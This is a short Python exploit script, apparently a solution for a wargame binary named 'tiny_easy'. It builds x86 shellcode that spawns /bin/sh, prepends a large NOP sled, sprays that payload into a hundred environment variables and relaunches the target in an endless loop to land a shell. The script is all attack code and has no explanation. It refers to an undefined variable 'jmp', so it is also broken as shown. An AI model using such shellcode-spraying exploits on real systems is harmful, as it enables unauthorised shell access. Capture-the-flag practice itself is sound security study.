from pwn import *
import os
import subprocess

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nop = "\x90"*4096

payload = nop+shellcode

env={}

for i in range(100):
    env["spray"+str(i)] = payload

while True:
    p = subprocess.Popen([jmp], executable="/home/tiny_easy/tiny_easy", env=env)
    p.wait()
